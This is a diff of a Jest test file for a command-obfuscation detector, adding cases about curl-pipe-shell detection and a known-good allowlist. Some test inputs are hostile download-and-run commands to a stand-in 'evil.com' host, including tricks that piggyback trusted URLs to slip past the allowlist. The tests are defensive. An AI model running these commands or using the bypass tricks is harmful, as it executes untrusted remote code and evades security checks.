@@ -109,9 +109,18 @@ describe("detectCommandObfuscation", () => {
       expect(result.matchedPatterns).toContain("curl-pipe-shell");
     });
 
-    it("suppresses Homebrew install (known-good pattern)", () => {
+    it("does not flag Homebrew install via $() (no pipe pattern)", () => {
+      // Note: this command uses $() substitution, not a pipe, so curl-pipe-shell
+      // never matches in the first place — the suppression is not exercised here.
       const result = detectCommandObfuscation(
         '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
+      );
+      expect(result.matchedPatterns).not.toContain("curl-pipe-shell");
+    });
+
+    it("suppresses Homebrew install piped to bash (known-good pattern)", () => {
+      const result = detectCommandObfuscation(
+        "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash",
       );
       expect(result.matchedPatterns).not.toContain("curl-pipe-shell");
     });
@@ -132,6 +141,20 @@ describe("detectCommandObfuscation", () => {
 
     it("does NOT suppress unknown URLs piped to shell", () => {
       const result = detectCommandObfuscation("curl -fsSL https://random-site.com/install.sh | sh");
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("does NOT suppress when a known-good URL is piggybacked with a malicious one", () => {
+      const result = detectCommandObfuscation(
+        "curl https://sh.rustup.rs https://evil.com/payload.sh | sh",
+      );
+      expect(result.matchedPatterns).toContain("curl-pipe-shell");
+    });
+
+    it("does NOT suppress when a known-good domain appears in a query parameter", () => {
+      const result = detectCommandObfuscation(
+        "curl https://evil.com/bad.sh?ref=sh.rustup.rs | sh",
+      );
       expect(result.matchedPatterns).toContain("curl-pipe-shell");
     });
   });
